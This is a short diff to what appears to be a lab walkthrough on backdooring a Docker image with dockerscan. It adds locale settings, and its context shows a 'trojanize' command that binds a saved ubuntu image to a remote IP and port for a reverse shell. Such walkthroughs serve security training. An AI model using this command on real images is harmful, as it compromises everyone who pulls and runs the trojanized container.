@@ -21,6 +21,14 @@ docker pull ubuntu:latest && docker save ubuntu:latest -o ubuntu-latest
 
 ##### Step 3:
 
+* Set the necessary environment variables for `dockerscan` to run
+
+```bash
+export LC_ALL=C.UTF-8
+
+export LANG=C.UTF-8
+```
+
 * Trojanize the saved docker file by running `dockerscan image modify trojanize ubuntu-latest -l <REMOTE_MACHINE_IP> -p <PORT> -o ubuntu-latest-trojanized`. It will create a `.tar` file.
 
 ![](img/trojan-docker-3.png)
